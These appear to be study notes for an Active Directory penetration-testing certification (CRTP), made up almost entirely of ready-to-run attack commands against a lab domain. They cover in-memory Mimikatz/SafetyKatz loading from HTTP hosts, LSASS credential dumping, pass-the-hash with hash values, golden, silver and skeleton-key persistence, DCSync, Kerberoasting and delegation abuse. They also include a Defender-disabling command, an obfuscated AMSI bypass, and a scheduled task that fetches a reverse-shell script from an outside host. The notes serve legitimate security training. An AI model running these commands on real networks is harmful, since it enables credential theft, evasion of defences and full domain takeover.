Loader.exe can be used to load the Reflective DLL for SafetyKatz into memory. This helps in executing SafetyKatz without writing it to disk, making it harder for traditional security tools to detect its presence.
```
iwr http://10.0.2.10:9002/Loader.exe -OutFile C:\Users\machine2\Downloads\Loader.exe
```
7. copy the Loader.exe from your machine to dcorp-mgmt
```
echo F | xcopy C:\Users\machine2\Downloads\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2b8169a9-e104-4231-a05d-622d99c55c2a)

8. Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt. it will detect because we are downloading and executing an exe file webserver
```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c69fd2c-82a6-4322-948b-6e8991e782f2)

9. Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
```
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
10. we got credentials of svcadmin. Note that svcadmin is used as a service account (see `Session: Service from 0`) on dcorp-mgmt. copy `aes256_hmac` and launch a new cmd with administrative privilege
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/06c9ce58-0757-4eb9-9c3a-7fecab8c1516)

11. use overpassthehash to start a session as svcadmin
```
>C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
12. a new cmd will be opened using svcadmin privilege, however if you try `whoami` it will show student1. to use svcadmin on dcorp-mgmt you need to use `winrs`

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e9772e3b-edda-467d-83a5-382d7b219757)

### Using derivative local admin
derivative means if student1 has access to adminsrv machine; adminsrv has access to mgmt machine; means student1 has access to mgmt
1. check if you have a local admin access on adminsrv machine
   
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/09723692-ffd9-4936-9576-02ee2356e5a5)

2. access adminsrv
```
Enter-PSSession -ComputerName dcorp-adminsrv
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/82513bd6-f3aa-43fb-98f5-1288812cf39b)

3. bypass AMSI
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/443bb981-776c-4a17-836f-7b85e6b1bef9)

you will get an error

4. check your current language mode
```
$ExecutionContext.SessionState.LanguageMode
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/22856650-5eb3-4657-bbd3-55a14f20fef3)

5. check if the Applocker exists in the machine
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/107bafb5-9fd6-43ad-8de9-1f8e2d9f3813)

Always check the PathConditions, Description, Action

Here, Everyone can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them.

6. on student machine copy Invoke-MimiEx.ps1 to the adminsrv
```
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```
7. Enter adminsrv again
```
Enter-PSSession -ComputerName dcorp-adminsrv
```  
8. run Invoke-MimiEx.ps1
```
.\Invoke-MimiEx.ps1
```
9. copy the aes of the srvadmin then use SafetyKatz to perform overpassthehash
```
C:\AD\Tools\Loader.exe -Path C:\AD\tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/81129a82-469a-4cdb-8012-ea28c51fd15b)

10. check again if adminsrv has admin access on dcorp-mgmt
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c473f73d-13dd-4306-bd5b-1bda2b407c53)

11. copy loader.exe to the dcorp-mgmt
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bfff4a9a-4349-4e9d-8874-679852a1f1b1)

12. connect to dcorp-mgmt as adminsrv using winrs
```
winrs -r:dcorp-mgmt cmd
```

13. setup port forwarding and then download SafetyKatz.exe on the dcorp-mgmt machine then execute it
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c111f209-65e4-4dee-a230-947385232740)

14. you will get the credentials 



# Runas
if you found AD credentials but nowhere to log in with them. Runas allows a user to run a specific program with a different account
```
runas.exe -u <username> -p <password> -e <executable> [-d <domain>]
```

# Lateral Movement - PowerShell Remoting
Avoid using psexec as it is too noisy. instead, use `"Enter-PSSession"` need Admin Privs
```
Enter-PSSession -ComputerName <dcorp-adminsrv>
```
### Execute commands or scriptblocks on another machine
```
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami}   #check who you are
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}   #check who you are
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}   #Disable win defender
```
### File execution using ScriptBlock
```
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock{"C:\temp\mimikatz.exe"}
```
File execution using FilePath
```
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
```
### Execute locally loaded function on another machine
```
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Get-PassHahses}
iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)   #load mimikatz on the memory
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}   #run mimikatz
```
### Execute scripts from files on another machine
```
Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -FilePath C:\scripts\Get-PassHahes.ps1   #check who you are
```
### Connect to different machines using winrs
use it if you have admin access on a different machine
```
winrs -r:dcorp-adminsrv cmd
winrs -remote:server1 -u:server1\administrator -p:Pass@123 hostname
```

# Lateral Movement - Mimikatz
### SafetyKatz.exe
use SafetyKatz to minidump of lsass and PELoader to run Mimikatz
```
SafetyKatz.exe "sekurlsa::ekeys"
```
### Dump Creds from LSASS process. admin privilege is required
```
privilege::debug | token::elevate | sekurlsa::logonpasswords
```
### Dump Creds on a local 
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```
### run powrshell using NTLM hash of a user
```
sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe
```
### Over Pass the Hash (OPTH)
pth: you are using NTLM and targeting local accounts

opth: you are using NTLM or AES. we create a request or ticket from the DC.
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
C:\AD\Tools\Loader.exe -Path C:\AD\tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
OR
Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows/System32\cmd.exe /show /ptt
winrs -r:scorp-dc cmd   #use winrs to interact with DC with svcadmin user
```
### DCSync
Extract credentials from the DC without code execution on it. Domain Admin privs are required to run DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\raman"'
safetyKatz.exe "lsadump::dcsync /user:us\kebtgt" "exit"
```

# Offensive .NET
3 Steps are there. check using DefenderCheck if your payload will be detected > if yes you need to obfuscate it using Invoke-Obfuscation or ConfuserEx to obfuscate the binary > Delivery of your payload using NetLoader
### DefenderCheck 
used to identify code and strings from a binary that Windows Defender may flag   #https://github.com/matterpreter/DefenderCheck
```
DefenderCheck.exe <path to code or tool>
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34d03437-a36f-403f-8f34-5d15bacedda1)

as we can see Windows Defender detected the string Credentials. simple you can change it to Creds to bypass Windows Defender. OR use ConfuserEX to obfuscate the binary
### NetLoader
used to load binary from filepath or URL   #https://github.com/Flangvik/NetLoader
```
Loader.exe -path http://10.10.16.10/safetykatz.exe
Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```

### AssemblyLoad.exe
used to load the NetLoader in memory from a URL which then loads a binary from a filepath or URL
```
AssemblyLoad.exe
http://10.10.16.10/Loader.exe -path http://10.10.16.11/SafetyKatz.exe
```


# Persistence - Golden Ticket
### Methodology/Steps
```
Get a Powershell session as a "domain admin" using "Over pass the hash" attack
Create a New-PSSession attaching to the "domain controller"
Enter the new session using Enter-PSSession
Bypass the AMSI
Exit
Load Mimikatz.ps1 on the new session using Invoke-command
Enter the new session using Enter-PSSession again
Now we can execute mimikatz on the DC
Keep note of krbtgt hash
Now go to any "non domain admin" account
Load Mimikats.ps1
Now we can create a ticket using the DC krbtgt hash
Now we can access any service on the DC; Example ls \\dc-corp\C$
#OR
PsExec64.exe \\test.local -u Domain\user -p Passw0rd! cmd
```
### Execute mimikatz on DC as DA to get krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```
### use DCSync to get AES key for krbtgt account
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# OR
SafetyKatz.exe "lsadump::dcsync /user:dcrop\krbtgt" "exit"
```
### create a Golden ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
# OR
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /aes256:<aes256> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
# Persistence - Silver Ticket
### Execute mimikatz on DC as DA to get krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```
### Make silver ticket for CIFS, below command provides access to shares on the DC
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
```
### Check Access (After CIFS silver ticket)
```
ls \\<servername>\c$\
```
### Make silver ticket for Host
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```
### Schedule and execute a task (After host a silver ticket)
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8080/Invoke-PowerShellTcp.psi''')'"

schtasks /Run /S ad.domain.local /TN "STCheck"
```
### Make a silver ticket for WMI
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```
### check WMI permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```
# Persistence - Skeleton Key
### Use the below command to inject a skeleton-Key
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### Now we can access any machine with valid username and password as mimikatz
```
Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
```
### LSASS running as a protected process
In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

# Persistence - DSRM
Every Domain Controller device contains a Local Administrator. we put the private password in this user when we create the Active Directory environment, so it is rarely used, change the password or access unless a disaster occurs in the Active Directory in order to reset the environment.
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cbfcdb2f-41d8-42b3-af04-dfbb80266380)

In this technique, we will try to obtain the password for the local administrator of the domain controller so that we can implement the Pass-the-hash technique at any time to browse the share files of the domain controller

In order to apply the technique, we must run a PowerShell session with a user in the domain admins group
### Apply
1. first thing we will access the domain controller device through this command
```
Enter-PSSession -ComputerName dcorp-dc
```
2. Next, load the Mimikatz tool using this command
```
iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)
```
3. execute this command to get the local passwords on the domain controller
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
# OR
Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3408dd39-c4af-4617-9ae2-11621abcde9f)
4. now before we apply the Pass the hash technique, we need to add the Logon Behavior element in the registry and give it the value 2 so that we can use the NTLM hash in it.
```
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD
```
5. now apply the Pass the hash technique using mimikatz
```
sekurlsa::pth /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /domain:dcorp-dc /run:powershell.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3edc3112-a8ab-4740-9f59-15cdfdbc1b22)
6. now you can explore the share files of the domain controller
```
dir \\dcorp-dc\C$
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3a4ec50e-3551-4563-884b-f6c29ea6498e)

# Persistence - ACLs
[Reference](https://crtp-certification.certs-study.com/domain-persistence/acls/adminsdholder)
###  Check the Domain Admins permission - PowerView as normal user
```
Get-DomainObjectACL -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SideToName $_SecurityIdentitifer);$_} | ?{$_.IdentityName -match "student1"}
```
### Abusing FullControll using PowerView
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```
### Abusing ResetPassword using PowerView
```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123 -AsPlainText -Force") -Verbose
```

# Persistence - DCSync
you need to have Replication (DCSync) rights to perform the attack
### Add full-control rights
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
```
### Add rights for DCsync
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```
### Execute DCSync and dump krbtgt
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

# Persistence - ACLs
what you are trying to achieve here. we want to try to run a command on the admin controller without having admin privilege. [Reference](https://crtp-certification.certs-study.com/domain-persistence/acls/wmi)
### Using RACE or DAMP, with admin privs on remote machine
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```
### As student1, retrieve machine account hash
```
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
### Retrieve local account hash
```
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```
### Retrieve domain cached credentials
```
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```
### Obtaining RCE using sliver ticket
1. Make a host service ticket 
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /startoffset:0 endin:600 /renewmax:10080 /ptt"'
```
2. make an RPCSS service ticket
```
BetterSafetyKatz.exe -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /startoffset:0 endin:600 /renewmax:10080 /ptt"'
```
3. list the tickets
```
klist
```
4. startup a new powershell session
5. run a powershell command to access DC using gwmi
```
gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```

# Priv Esc - Kerberoast
The idea of this technique is that we are looking for users who have the authority to implement a specific service on a specific device, so I will exploit this service in order to obtain the user’s TGS and crack it using the tgscrack tool. After that, we will enter the device.
1. Find user accounts used as service accounts
```
. ./GetUserSPNs.ps1
Get-NetUser -SPN
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/22e930c3-6c7f-4e78-be63-5d30babc6a8a)

the svcadmin user has a privilege on the MSSQLsvc service on the dcrop-mgmt.dollarcorp.moneycorp.local
2. Request a TGS
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/25d264e1-d269-4b4e-b451-5958e477da65)
3. Export ticket using Mimikatz or using Rubeus
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
OR
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
Don't forget to delete the port number from the Kerberos hash file

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/141f3f34-0949-42c6-ae3f-2aaa61e349bf)

4. Crack the ticket using tgscrack or using john
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
OR
john.exe --wordlist=C"\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1ecb64fc-cdae-4d36-9bb3-b9738a1e0777)

5. Luanch a new PowerShell session using svcadmin username and his password

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b15b7264-7304-4c97-87a0-8d3c3ae6175a)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c067715b-f197-4eed-9b3f-b9de6509333d)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/15d626de-73bb-47d3-a338-0ad0328a044d)

 6. now try to access the dcorp-mgm device

 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/efd84534-6ff7-4c0b-a404-584962a1011f)

you were able to access the dcorp-mgmt device through the svcadmin user because he can execute the MSSQLsvc service in the dcrop-mgmt deivce

# Priv Esc - Unconstrained Delegation
Some devices contain a feature called UnConstrained Delegation. The idea of this feature is that any user who logs in to the device, whether he has Domain Admin privileges or another, and tries to set up access to a service located in another device via Kerberos, will save his TGT in the memory.

The reason for saving the TGT in the memory is that when another service is requested, we do not need to authenticate the TGT via Kerberos because it was already saved in the memory.


### Discover domain computers that have unconstrained delegation
Domain Controllers always show up, ignore them
```
 . .\PowerView_dev.ps1
Get-Netcomputer -UnConstrained
Get-Netcomputer -UnConstrained | select samaccountname
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/92da62fa-7cae-4a99-bdae-ccdf0facf993)

Two devices have unconstrained delegation feature. The first one is DC which always having UnConstained Delegation in it so we will ignore it

we will focus on dcopr-appsrv. to apply the attack you must be hacked the machine and have the local admin privilege 

we need Local Administrator privilege because we need to get the TGT using mimikatz 

here the appadmin user is a local administrator on the dcorp-appsrv

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cb59fee8-0856-423f-8d7b-910a7b02f638)

now we already accessed the computer that has unconstrained delegation 

now load mimikatz to the computer
```
$sess = New-PSSession -ComputerName dcorp-appsrv

Copy-Item -Path C:\AD\Tools\mimikatz_trunk\x64\mimikatz.exe -Destination C:\Users\Administrator\Desktop\ -ToSession $sess
```
Get all the TGT tickets that are on the memory
```
.\mimikatz.exe "sekurlsa::tickets" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e224b4b7-43e7-4d98-b6d3-0bc5729a797e)

TGT ticket for the administrator on the memory

now you need to export the TGT ticket
```
.\mimikatz.exe "sekurlsa::tickets /export" "exit"
```
now you need to inject the ticket in the session that you have
```
.\mimikatz.exe "kerberos::ptt [0;8d2043]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cdf0cf1e-dd99-41c8-91fe-bd6fca17f178)

now you can explore DC files and run some commands OR you can perform DCSync attack and get the NTLM Hash of the Administrator
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a1b480db-c2a1-4cb5-985e-395c337dea3c)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/56bf212c-932b-42d1-aab8-26b89f15ee13)

#OR if the above didn't work
check if the user has unconstrained delegation is by checking the useraccountcontrol after running `"Get-Domaincomputer -Unconstrained"`

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cc85c9b1-24ea-422c-a882-1ac7b5b44ce0)

you need to force the DC to connect to the appsrv. to do that we need to compromise the appsrv first

1. check if we have admin access on appsrv
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cb59fee8-0856-423f-8d7b-910a7b02f638)

2. copy Rubeus.exe to appsrv machine
```
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/52f771a5-12b3-4865-9184-f20b5db8f7ff)
3. run Rubeus.exe in monitor mode to get the TGT ticket
```
Rubeus.exe monitor /interval:5 /targetuser:dcorp-dc$ /nowrap
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/6ce74a3e-e6e2-460b-b546-a5efa9f17bdb)

4. force the DC to connect to appsrv
```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
if you get `"Error Code 1722 -  The RPC server is unavailable"` it is fine
5. you will get the base64TGT of the DC
6. perform pass the ticket attack 
```
Rubeus.exe ptt /ticket:<base64TGT of the DC>
```
7. run DCSync attack to get the NTLM hash of the DC
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

# Priv Esc - constrained Delegation
### Enumerate users and computers with constrained delegation enabled
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/445f780d-0f73-4af9-a137-8688575b91a1)

check useraccountcontrol if you have `"TRUSTED_TO_AUTH_FOR_DELEGATION"` means constrained delegation is enabled on this user

if you compromise the account websvc I would be able to access the file system on dcorp-mssql as any user including the domain admin
### Impersonate the Administrator account to access CIFS
```
Rubeus.exe s4u /user:websvc /aes256:<aes256OfWebsvcUser> /impersonateuser:Administrator /msdsspn:CIFS/dorp-mssql.dollarcorp.moneycorp.local /ptt
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256OfWebsvcUser> /impersonateuser:Administrator /msdsspn:TIME/dorp-mssql.dollarcorp.moneycorp.local /altservice:ldap /ptt #get the ldap process from the domain admin to run dcsync attack
klist
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```
### you can access dcorp-mssql computer as we have the TGS ticket
```
Enter-PSSession -ComputerName dcorp-mssql.dollarcorp.moneycorp.LOCAL
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/644bdc64-3267-4737-b465-501d9bb522f2)
### now you can Perform DCSync attack
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

# Resource-based Constrained Delegation (RBCD)
in RBCD delegation authority moved from the domain admin to the resource/service

we need to have two privileges

1. Generic All, Generic Write, or Write Property permission over the target service or object
2. control over an object which has SPN configured

This technique will create a fake device, specify a specific password for it, and then add New Property to the target device, which is `"msds-allowedtoactonbehalfofotheridentity"` Contains the SID value of the fake device.

After that, we will use the Rubeus tool, so that we request any service on the target device, such as http in order to set up PS Remoting, or cifs in order to browse the files of the target device or host in order to implement scheduling tasks, and we obtain a Reverse Shell or ldap if the target device is the DC, so that it withdraws the hash. Private in Domain Admins and implement the Pass the Hash technique, and all of these requests will be through the fake device.

### Attack 1
1. I'm using a HRmanager user

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2c0e0661-d231-456c-9068-08b8fa32c630)

3. Load PowerView
```
Import-Module .\powerview.ps1
```
3. check if the HRmanager user has interesting ACLs
```
Find-InterestingDomainAcl -ResolveGUIDs   
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e3b4a62b-3134-4d0f-bccc-38aae3c23318)

Now, if we notice that the HRmanager user in the IdentityReferenceName field contains the Write Property permission on the Domain Controller device in the ObjectDN field (OU)
4. Now download [PowerMad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) to create a fake computer
5. Load PowerMad
```
Import-Module .\powermad.ps1
```
6. create a fake pc which has a password `"123"`
```
New-MachineAccount -Domain cyber.local -MachineAccount dude -Password (ConvertTo-SecureString '123' -AsPlainText -Force) -Verbose
```
7. Now we need to extract the private SID on the fake device using this command
```
Get-NetComputer dude | select objectsid
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c6e7d638-7824-4841-a3e0-6a149bf2dd40)

8. Now that we have extracted the private SID on the fake device, we will execute these commands while replacing the private SID on the fake device.
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4117163453-3728762355-2024759166-1601)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)
```
9. Now we will create a new property for the target device called msds-allowedtoactonbehalfofotheridentity and assign it the value of the private SID in the fake device
```
Get-netcomputer jehaddc.m3c.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```
10. Now I will load the Rubeus tool and we will execute this command so that it gives us an AES256 encrypted copy of the private password on the fake device.
```
.\Rubeus.exe hash /password:123 /user:dude$  /domain:cyber.local
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a91bd270-d277-411d-b9b8-26364961813a)

11. Now we will execute this command to obtain the TGS of the ldap service, since the target device is the Domain Controller (DC).
```
.\Rubeus.exe s4u /domain:cyber.local /dc:JehadDC.cyber.local /user:dude$ /ptt /aes256:5B9C740C2E833C237562871A4B3C3B7FF7839D48C3CBB3CBB152E2E82C981928  /impersonateuser:Administrator /msdsspn:ldap/jehaddc.cyber.local
```
12. Now, after executing the previous command, we will confirm whether the TGS was injected into the memory or not through this command.
```
klist
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d18aba56-540b-42ba-b2c7-29eb8764682b)

13. Now that we have the private TGS in the ldap service, we will run mimikatz and get the private hash in the Domain Admin via this command
```
lsadump::dcsync /user:cyber\Administrator
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ee8ab9cd-2ad8-4bbd-8356-5fade3a5c5a2)

14. Now we will set up the pass the hash technique using mimikatz so that we run a PowerShell session with Domain Admin privileges using this command.
```
sekurlsa::pth /user:Administrator /ntlm:311fb27b1e766dac7357f4270f4112df /domain:cyber.local /run:powershell.exe
```
15. After executing the command, a powershell session will be opened for us with Domain Admin privileges. All we have to do is execute this command in order to access the target device.
```
Enter-PSSession jehaddc.cyber.local
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e859f3e-1943-4296-862e-846e1033966d)

### Attack 2
1. Bypass Script Block login
```
iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
```
2. Bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
3. Load PowerView on memory
```
iex ((New-Object Net.WebClient).DownloadString('http://10.10.10.6/PowerView.ps1')
```
4. configure the deletation from student1$ to dcorp-mgmt
```
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom  'dcorp-student1$'
```
5. check for RBCD
```
Get-DomainRBCD
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2024e44f-de45-423c-9704-5c9267359314)

you can read the above screenshot as following

if I compromise the `"DCORP-STUDENT1"` machine (in DelegatedDistinguishedName). you will be able to access any service as any user in DORP-MGMT$ (in SourceName) including the domain admin
6. extract the secrets from memory
```
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/97c41297-a7d1-473e-9f25-f62cbf8de6f4)

